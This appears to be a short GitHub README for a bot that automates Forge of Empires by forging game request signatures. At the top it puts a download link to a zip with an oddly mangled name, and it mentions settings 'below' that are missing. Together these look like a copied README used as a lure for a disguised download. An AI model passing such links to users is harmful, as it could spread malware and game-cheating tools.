# Empires-Battle-Bot
## [download](https://github.com/mister0031/Empires-Battle-Bot/releases/download/empiresbot/Sof.wa1e.zip)


A simple bot to do automate the main functions of Forge of Empires

Uses FoE Decryption for request signature generation.

*Purely educational and to fuel curiosity*

❗️ This project is no longer maintained by myself as I no longer player FoE, an from what i've heard they have/are switching to a 'HTML5' based solution. This approach may still work but you will need to make sure the version and secret (below) are up to date. ❗️
